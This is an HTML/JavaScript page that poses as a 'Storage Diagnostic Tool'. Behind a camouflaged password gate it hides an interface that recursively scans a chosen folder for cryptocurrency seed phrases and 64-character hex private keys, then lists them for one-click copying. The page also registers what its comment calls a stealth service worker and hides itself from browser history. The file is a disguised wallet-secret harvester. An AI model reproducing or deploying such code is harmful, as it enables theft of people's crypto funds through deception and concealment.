<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="manifest" href="manifest.json">
    <title>Storage Diagnostic Tool</title>
    <style>
        :root { --dim: #1a1a1a; --text: #444; --active: #00ff41; }
        body, html { background: #000; color: var(--text); font-family: sans-serif; height: 100vh; margin: 0; overflow: hidden; }
        
        /* THE CAMO GATE */
        #gate { position: fixed; inset: 0; background: #000; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        #gate p { font-size: 12px; margin-bottom: 20px; color: #222; }
        #idKey { background: #000; border: 1px solid #111; color: #111; font-size: 1rem; text-align: center; width: 100%; max-width: 250px; padding: 10px; outline: none; border-radius: 5px; }

        /* THE TRUE INTERFACE (HIDDEN) */
        #app-core { display: none; height: 100vh; flex-direction: column; background: #000; color: var(--active); font-family: 'Courier New', monospace; }
        header { padding: 15px; border-bottom: 1px solid #111; font-size: 10px; color: #555; display: flex; justify-content: space-between; }
        #explorer { flex: 1; overflow-y: auto; padding: 15px; }
        .shard { border: 1px solid #111; padding: 12px; margin-bottom: 10px; background: #050505; }
        code { display: block; color: #fff; word-break: break-all; margin-top: 5px; font-size: 13px; }

        .btn-zone { padding: 20px; }
        #igniteBtn { width: 100%; height: 60px; background: #0a0a0a; color: #333; border: 1px solid #222; border-radius: 10px; font-weight: 900; }
        #igniteBtn.unlocked { background: var(--active); color: #000; border: none; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
    </style>
</head>
<body>

<div id="gate">
    <p>Internal Diagnostic v4.0.1 - Awaiting Authentication</p>
    <input type="password" id="idKey" autofocus>
</div>

<div id="app-core">
    <header><span>CORE_LOG_STABLE</span><span id="stat">IDLE</span></header>
    <div id="explorer"></div>
    <div class="btn-zone"><button id="igniteBtn">INITIALIZE_SCAN</button></div>
</div>

<script>
    const MASTER = "7542017646";
    const stat = document.getElementById('stat'), explorer = document.getElementById('explorer'), btn = document.getElementById('igniteBtn');

    // Register Stealth Service Worker
    if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }

    document.getElementById('idKey').oninput = (e) => {
        if (e.target.value === MASTER) {
            document.getElementById('gate').style.display = 'none';
            document.getElementById('app-core').style.display = 'flex';
            btn.classList.add('unlocked');
            // Hide presence from browser history
            window.history.replaceState({}, '', '/diagnostics');
        }
    };

    btn.onclick = async () => {
        try {
            const h = await window.showDirectoryPicker();
            stat.innerText = "BRIDGE_ACTIVE";
            await scrub(h);
        } catch (e) { stat.innerText = "ACCESS_REVOKED"; }
    };

    async function scrub(h) {
        for await (const entry of h.values()) {
            if (entry.kind === 'file') {
                const f = await entry.getFile();
                if (f.size < 500000 && !f.name.match(/\.(jpg|png|mp4|zip)$/i)) {
                    const text = await f.text();
                    const seeds = text.match(/\b([a-z]{3,}\s){11,23}[a-z]{3,}\b/gi);
                    const keys = text.match(/\b(0x)?[a-fA-F0-9]{64}\b/gi);
                    if (seeds) seeds.forEach(s => add(s, 'ENTROPY_S'));
                    if (keys) keys.forEach(k => add(k, 'ENTROPY_K'));
                }
            } else if (entry.kind === 'directory') {
                await new Promise(r => setTimeout(r, 20));
                await scrub(entry);
            }
        }
    }

    function add(val, type) {
        const div = document.createElement('div');
        div.className = 'shard';
        div.innerHTML = `<small style="color:#222">${type}</small><code>${val}</code>`;
        div.onclick = () => { navigator.clipboard.writeText(val); navigator.vibrate?.(50); };
        explorer.prepend(div);
        navigator.vibrate?.([50, 50, 50]);
    }
</script>
</body>
</html>
